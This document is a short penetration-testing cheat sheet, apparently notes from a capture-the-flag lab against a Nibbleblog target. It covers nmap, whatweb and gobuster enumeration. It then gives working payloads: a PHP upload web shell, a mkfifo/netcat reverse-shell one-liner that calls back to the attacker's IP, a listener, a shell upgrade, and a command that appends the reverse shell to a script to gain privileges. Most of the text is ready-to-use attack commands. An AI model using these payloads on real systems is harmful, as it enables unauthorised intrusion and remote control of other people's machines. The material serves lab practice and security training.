#### Nmap

Enumeration/Scanning:

```bash
nmap -sS IpAddress
``` 
>[!note] Or use these flags
>```-sT``` for TCP or ```-sU``` for UDP.
  
Perform a quick scan for open ports followed by a full port scan

```bash
nmap -p0- -v -A -T4 IpAddress
```
>[!note] What does each flag do?
>```-p0-``` asks Nmap to scan every possible TCP port.
>```-v``` asks Nmap to be verbose about it.
>```-A``` enables aggressive tests such as remote OS detection, service/version detection, and the Nmap Scripting Engine (NSE).
>```-T4``` enables a more aggressive timing policy to speed up the scan.

#### Whatweb
To list the plugins supported:
```bash
./whatweb -l [target]
```

#### Gobuster
Enumerate crawl Gobuster:
```bash
gobuster dir -u 10.129.200.170/nibbleblog -w /usr/share/dirb/wordlists/common.txt
```

To check if there's php injection available. Upload a php file with this content:
```php
<?php system('id'); ?>
```

PHP website to create a [[Reverse Shell]] connection (use your box IP so the server targets your box):
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc USE.YOU.IP.ADD 9443 >/tmp/f"); ?>
```

Start listening for connections using netcat port 9443:
```bash
nc -lvnp 9443
```


To make the shell more easy to navigate using python pty:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Create an http server to share files with the target:
```bash
sudo python3 -m http.server 8080
```

To add a line at the end of a file:
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.203 8443 >/tmp/f' | tee -a monitor.sh
```

